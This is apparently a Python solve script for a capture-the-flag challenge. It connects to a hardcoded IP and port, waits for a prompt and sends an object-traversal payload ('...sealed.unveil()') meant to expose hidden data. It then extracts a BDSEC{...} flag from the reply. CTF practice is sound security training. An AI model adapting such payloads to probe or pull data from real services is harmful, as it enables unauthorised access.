#!/usr/bin/env python3
import argparse
import re
import socket
import sys
import time


HOST = "66.228.50.16"
PORT = 48271
PAYLOAD = 'root.observer.right.memory.catalog.index.sealed.unveil()'


def recv_until_prompt(sock, timeout=5):
    sock.setblocking(False)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            time.sleep(0.02)
            continue
        if not chunk:
            break
        data += chunk
        if data.endswith(b"> ") or b"\n> " in data:
            break
    return data


def recv_all(sock, timeout=3):
    sock.setblocking(False)
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            time.sleep(0.02)
            continue
        if not chunk:
            break
        data += chunk
    return data


def run(host, port):
    with socket.create_connection((host, port), timeout=8) as sock:
        banner = recv_until_prompt(sock)
        if b"> " not in banner:
            raise RuntimeError("prompt not received")
        sock.sendall(PAYLOAD.encode() + b"\n")
        return banner + recv_all(sock)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=HOST)
    parser.add_argument("port", nargs="?", type=int, default=PORT)
    args = parser.parse_args()

    raw = run(args.host, args.port)
    text = raw.decode("utf-8", "replace")
    sys.stdout.write(text)

    match = re.search(r"BDSEC\{[^}\n]+\}", text)
    if match:
        print(f"\nFLAG: {match.group(0)}")


if __name__ == "__main__":
    main()
